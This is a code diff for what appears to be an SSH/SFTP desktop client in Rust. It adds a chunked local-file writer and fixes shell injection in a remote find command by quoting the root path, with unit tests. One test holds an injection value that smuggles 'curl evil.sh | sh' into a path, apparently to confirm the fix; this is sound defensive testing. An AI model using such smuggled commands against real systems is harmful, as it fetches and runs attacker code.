@@ -9,6 +9,54 @@ use std::sync::Arc;
 /// 单次读取上限（8 MiB）：防止前端误传超大 length 撑爆内存
 const MAX_READ_LEN: usize = 8 * 1024 * 1024;
 
+/// 本地写入分块上限（base64 解码后）
+const MAX_LOCAL_CHUNK: usize = 8 * 1024 * 1024;
+
+/// 将 SFTP 下载的一个分块写入本地文件（替代前端 plugin-fs writeFile 直调）。
+/// `append=false` 时截断文件（首块），`append=true` 时追加（后续块）。
+#[tauri::command]
+pub async fn sftp_write_local_chunk(
+    path: String,
+    data_b64: String,
+    append: bool,
+) -> Result<u64, String> {
+    let p = crate::utils::path_guard::validate_abs_sane_path(&path)?;
+    if data_b64.len() > MAX_LOCAL_CHUNK * 4 / 3 + 4 {
+        return Err(format!("Chunk too large (> {MAX_LOCAL_CHUNK} bytes)"));
+    }
+    let bytes = tokio::task::spawn_blocking(move || {
+        general_purpose::STANDARD
+            .decode(&data_b64)
+            .map_err(|e| format!("BAD_B64: {e}"))
+    })
+    .await
+    .map_err(|e| format!("JOIN: {e}"))??;
+    if bytes.len() > MAX_LOCAL_CHUNK {
+        return Err(format!("Chunk too large (> {MAX_LOCAL_CHUNK} bytes)"));
+    }
+
+    let written = {
+        let path_display = p.display().to_string();
+        tokio::task::spawn_blocking(move || -> std::io::Result<u64> {
+            let mut opts = std::fs::OpenOptions::new();
+            opts.create(true).write(true);
+            if append {
+                opts.append(true);
+            } else {
+                opts.truncate(true);
+            }
+            use std::io::Write;
+            let mut f = opts.open(&p)?;
+            f.write_all(&bytes)?;
+            Ok(bytes.len() as u64)
+        })
+        .await
+        .map_err(|e| format!("JOIN: {e}"))?
+        .map_err(|e| format!("LOCAL_WRITE {path_display}: {e}"))?
+    };
+    Ok(written)
+}
+
 #[derive(Serialize)]
 pub struct SftpEntry {
     pub name: String,
@@ -442,11 +490,7 @@ pub async fn ssh_sftp_search(
         .await
         .map_err(|e| format!("SFTP_SEARCH_OPEN: {e}"))?;
 
-    let mut cmd = format!("find {} -name '{}'", root, shell_escape(&pattern));
-    if let Some(d) = max_depth {
-        cmd.push_str(&format!(" -maxdepth {}", d));
-    }
-    cmd.push_str(" -not -path '*/.*' 2>/dev/null");
+    let cmd = build_find_command(&root, &pattern, max_depth);
 
     ch.exec(true, cmd.into_bytes())
         .await
@@ -473,6 +517,21 @@ pub async fn ssh_sftp_search(
         .filter(|l| !l.is_empty())
         .collect();
     Ok(lines)
+}
+
+/// 构造远端 find 命令。root 与 pattern 均需单引号转义，防止远端 shell 注入，
+/// 同时让含空格的路径保持为单一参数。
+fn build_find_command(root: &str, pattern: &str, max_depth: Option<u32>) -> String {
+    let mut cmd = format!(
+        "find '{}' -name '{}'",
+        shell_escape(root),
+        shell_escape(pattern)
+    );
+    if let Some(d) = max_depth {
+        cmd.push_str(&format!(" -maxdepth {}", d));
+    }
+    cmd.push_str(" -not -path '*/.*' 2>/dev/null");
+    cmd
 }
 
 fn shell_escape(s: &str) -> String {
@@ -520,4 +579,47 @@ async fn rm_recursive_impl(sftp: &SftpSession, path: &str) -> Result<(), String>
             .map_err(|e| format!("SFTP_RM_FILE: {e}"))?;
     }
     Ok(())
+}
+
+#[cfg(test)]
+mod tests {
+    use super::*;
+
+    #[test]
+    fn test_build_find_command_escapes_root_and_pattern() {
+        let cmd = build_find_command("/var/log", "*.log", None);
+        assert_eq!(
+            cmd,
+            "find '/var/log' -name '*.log' -not -path '*/.*' 2>/dev/null"
+        );
+    }
+
+    #[test]
+    fn test_build_find_command_escapes_malicious_root() {
+        // root 必须被包在单引号参数里，分号/管道不能逃逸成 shell 语法
+        let evil = "/tmp; curl evil.sh | sh; #";
+        let cmd = build_find_command(evil, "x", None);
+        assert!(cmd.starts_with("find '"), "root was not quoted: {cmd}");
+        let first_arg_end = cmd.find("' -name").expect("quoted root arg");
+        assert!(cmd[..first_arg_end].contains(evil));
+    }
+
+    #[test]
+    fn test_build_find_command_escapes_pattern_quote() {
+        let cmd = build_find_command("/tmp", "it's", None);
+        assert!(cmd.contains("-name 'it'\\''s'"), "got: {cmd}");
+    }
+
+    #[test]
+    fn test_build_find_command_max_depth() {
+        let cmd = build_find_command("/tmp", "*.tmp", Some(3));
+        assert!(cmd.contains(" -maxdepth 3"), "got: {cmd}");
+    }
+
+    #[test]
+    fn test_build_find_command_root_with_spaces() {
+        // 附带修复：带空格的路径此前会拆成多个参数
+        let cmd = build_find_command("/home/u/My Files", "a", None);
+        assert!(cmd.starts_with("find '/home/u/My Files'"), "got: {cmd}");
+    }
 }
